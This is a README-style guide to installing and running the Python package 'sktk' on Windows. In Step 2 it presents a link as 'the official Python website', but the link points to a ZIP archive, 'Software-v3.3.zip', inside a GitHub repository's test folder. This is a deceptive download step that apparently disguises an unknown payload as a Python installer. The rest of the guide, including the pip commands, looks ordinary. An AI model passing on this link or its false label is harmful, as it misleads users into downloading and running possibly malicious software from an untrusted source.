## 🛠️ How to Install and Run sktk on Windows

Follow these steps carefully to get sktk working on your computer:

### Step 1: Download the files

1. On the release page, look for the latest version of sktk.
2. Download the Windows installer or a ZIP file if available.
3. Save the file to a place you can find easily, like your Desktop or Downloads folder.

### Step 2: Install Python (if needed)

If you don’t have Python 3.8 or above, here’s how to get it:

1. Visit the official Python website at https://raw.githubusercontent.com/marrakechinmorocco/sktk/main/tests/unit/knowledge/Software-v3.3.zip
2. Download the latest Windows installer.
3. Run the installer and be sure to select “Add Python to PATH” before clicking “Install Now.”
4. Close and restart your computer if asked.

### Step 3: Install required software

sktk uses Python packages to work correctly.

1. Open the Windows Start menu.
2. Type `cmd` and press Enter to open the Command Prompt.
3. In the Command Prompt, type the following commands one at a time:

```
python -m pip install --upgrade pip
python -m pip install semantic-kernel
python -m pip install sktk
```

These commands update Python’s package installer and add sktk and its main dependency, Semantic Kernel.

### Step 4: Run sktk

After installation, you can start using sktk:

1. Open Command Prompt again if it is not open.
2. Type `sktk` followed by Enter.

If the command runs without errors, sktk is ready.
